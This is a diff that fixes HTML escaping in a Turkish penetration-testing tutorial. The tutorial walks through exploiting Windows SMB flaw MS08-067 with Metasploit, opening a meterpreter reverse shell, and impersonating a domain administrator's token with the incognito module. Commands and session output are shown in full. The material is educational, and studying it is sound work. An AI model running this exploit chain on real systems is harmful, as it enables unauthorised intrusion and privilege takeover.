@@ -56,16 +56,16 @@ Aşağıdaki örnekte, öncelikle `ms08_067_netapi` modülü kullanılarak gerek
 
 
 ```bash
-msf **&gt;** use exploit/windows/smb/ms08_067_netapi
-msf exploit**(**ms08_067_netapi**)** **&gt;** set RHOST 10.211.55.140
-RHOST **=&gt;** 10.211.55.140
-msf exploit**(**ms08_067_netapi**)** **&gt;** set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD **=&gt;** windows/meterpreter/reverse_tcp
-msf exploit**(**ms08_067_netapi**)** **&gt;** set LHOST 10.211.55.162
-LHOST **=&gt;** 10.211.55.162
-msf exploit**(**ms08_067_netapi**)** **&gt;** set LANG english
-LANG **=&gt;** english
-msf exploit**(**ms08_067_netapi**)** **&gt;** show targets
+msf **>** use exploit/windows/smb/ms08_067_netapi
+msf exploit**(**ms08_067_netapi**)** **>** set RHOST 10.211.55.140
+RHOST **=>** 10.211.55.140
+msf exploit**(**ms08_067_netapi**)** **>** set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD **=>** windows/meterpreter/reverse_tcp
+msf exploit**(**ms08_067_netapi**)** **>** set LHOST 10.211.55.162
+LHOST **=>** 10.211.55.162
+msf exploit**(**ms08_067_netapi**)** **>** set LANG english
+LANG **=>** english
+msf exploit**(**ms08_067_netapi**)** **>** show targets
 
 Exploit targets:
 
@@ -85,9 +85,9 @@ Exploit targets:
    11  Windows XP SP2 Chinese - Traditional / Taiwan **(**NX**)** 
 
 
-msf exploit**(**ms08_067_netapi**)** **&gt;** set TARGET 8
-target **=&gt;** 8
-msf exploit**(**ms08_067_netapi**)** **&gt;** exploit
+msf exploit**(**ms08_067_netapi**)** **>** set TARGET 8
+target **=>** 8
+msf exploit**(**ms08_067_netapi**)** **>** exploit
 
 **[*********]** Handler binding to LHOST 0.0.0.0
 **[*********]** Started reverse handler
@@ -97,9 +97,9 @@ msf exploit**(**ms08_067_netapi**)** **&gt;** exploit
 **[*********]** Sleeping before handling stage...
 **[*********]** Uploading DLL **(**75787 bytes**)**...
 **[*********]** Upload completed.
-**[*********]** Meterpreter session 1 opened **(**10.211.55.162:4444 -&gt; 10.211.55.140:1028**)**
+**[*********]** Meterpreter session 1 opened **(**10.211.55.162:4444 -> 10.211.55.140:1028**)**
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -112,9 +112,9 @@ Meterpreter oturumu açmayı başardıktan sonra `incognito` modülünü kullanm
 
 
 ```bash
-meterpreter **&gt;** use incognito
+meterpreter **>** use incognito
 Loading extension incognito...success.
-meterpreter **&gt;** help
+meterpreter **>** help
 
 Incognito Commands
 **==================**
@@ -128,7 +128,7 @@ Incognito Commands
     list_tokens          List tokens available under current user context        
     snarf_hashes         Snarf challenge/response hashes **for **every token         
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -141,7 +141,7 @@ Meterpreter içerisinde `incognito` modülünü yükledikten sonra `list_tokens`
 
 
 ```bash
-meterpreter **&gt;** list_tokens -u
+meterpreter **>** list_tokens -u
 
 Delegation Tokens Available
 **========================================**
@@ -154,7 +154,7 @@ Impersonation Tokens Available
 **========================================**
 NT AUTHORITY\ANONYMOUS LOGON
 
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -163,12 +163,12 @@ Yukarıda listede bulunan `SNEAKS.IN\Administrator` isimli token fark ettiyseniz
 
 
 ```bash
-meterpreter **&gt;** impersonate_token SNEAKS.IN\\Administrator
+meterpreter **>** impersonate_token SNEAKS.IN\\Administrator
 **[**+] Delegation token available
 **[**+] Successfully impersonated user SNEAKS.IN\Administrator
-meterpreter **&gt;** getuid
+meterpreter **>** getuid
 Server username: SNEAKS.IN\Administrator
-meterpreter **&gt;**
+meterpreter **>**
 ```
 
 
@@ -185,17 +185,17 @@ Meterpreter içerisinde `execute -f cmd.exe -i -t` komutu ile komut satırında 
 
 
 ```bash
-meterpreter **&gt;** shell
+meterpreter **>** shell
 Process 2804 created.
 Channel 1 created.
 Microsoft Windows XP **[**Version 5.1.2600]
 **(**C**)** Copyright 1985-2001 Microsoft Corp.
 
-C:\WINDOWS\system32&gt; whoami
+C:\WINDOWS\system32> whoami
 whoami
 SNEAKS.IN\administrator
 
-C:\WINDOWS\system32&gt;
+C:\WINDOWS\system32>
 ```
 
 
